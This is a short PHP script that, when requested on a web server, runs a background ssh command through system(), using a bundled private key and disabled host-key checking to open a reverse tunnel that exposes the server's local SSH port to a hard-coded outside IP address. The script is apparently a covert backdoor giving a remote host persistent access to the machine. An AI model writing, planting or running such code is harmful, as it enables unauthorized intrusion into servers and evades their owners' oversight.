<?php
// ip='34.219.135.26';
function bgcommand($command) {
echo '<pre>';
echo $command;
echo '
';
$last_line = system($command.' 2>&1 &', $retval);
echo '
</pre>
<hr />Last line of the output: ' . $last_line . '
<hr />Return value: ' . $retval;
}

bgcommand('ssh -i SJMR.txt -o StrictHostKeyChecking=no -n -N -R20022:127.0.0.1:22 ubuntu@34.219.135.46');
?>